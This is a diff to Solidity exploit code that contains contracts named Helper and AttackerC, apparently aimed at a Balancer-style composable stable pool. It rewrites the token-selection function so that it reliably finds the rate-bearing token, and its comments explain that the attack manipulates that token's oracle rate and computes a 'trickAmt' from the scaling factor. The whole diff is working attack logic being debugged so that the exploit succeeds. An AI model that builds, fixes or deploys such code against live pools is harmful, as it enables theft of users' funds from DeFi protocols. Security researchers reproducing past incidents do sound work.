@@ -107,21 +107,28 @@ contract Helper {
         return trickAmt;
     }
 
+    // `idx` must be the RATE-BEARING token: the non-BPT token that has a rate provider
+    // (equivalently, scalingFactor > 1e18). The exploit manipulates *that* token's oracle
+    // rate, and get_trickAmt(scalingFactors[idx]) divides by (scalingFactor - 1e18), so a
+    // plain token (e.g. wETH, scalingFactor == 1e18) would cause a divide-by-zero.
+    //
+    // Selecting by MAX BALANCE (previous logic) is incorrect: the token with the larger
+    // balance is not necessarily the rate-bearing one -- that only held here by coincidence
+    // of pool composition. Pick deterministically via the pool's rate providers instead.
     function get_index(
-        address[] memory tokens, 
-        uint256[] memory balances,
+        address pool,
+        address[] memory tokens,
         uint256 BptIndex
-    ) public returns (uint256 idx) {
-        uint256 idx = 0;
-        uint256 maxbalance = balances[idx];
-        for (uint256 i = 1; i < tokens.length; i++) {
+    ) public returns (uint256) {
+        address[] memory rateProviders = IComposableStablePool(pool).getRateProviders();
+        require(rateProviders.length == tokens.length, "get_index: rateProviders/tokens length mismatch");
+        for (uint256 i = 0; i < tokens.length; i++) {
             if (i == BptIndex) continue;
-            if (balances[i] > maxbalance) {
-                maxbalance = balances[i];
-                idx = i;
+            if (rateProviders[i] != address(0)) {
+                return i; // the (single) non-BPT token with a rate provider
             }
         }
-        return idx;
+        revert("get_index: no rate-bearing token (with a rate provider) found");
     }
 
 
@@ -358,7 +365,7 @@ contract AttackerC {
             IERC20(address(tokens[i])).approve(balancer, type(uint256).max);
         }
 
-        uint256 idx = helper.get_index(tokens, startBalances, BptIndex);
+        uint256 idx = helper.get_index(pool, tokens, BptIndex);
         // Refresh the token rate cache BEFORE reading scalingFactors so that
         // sf[idx] reflects the live oracle rate instead of the stale cached value.
         // trickAmt = floor(1e18 / (sf - 1e18)) is sensitive to sf at the integer
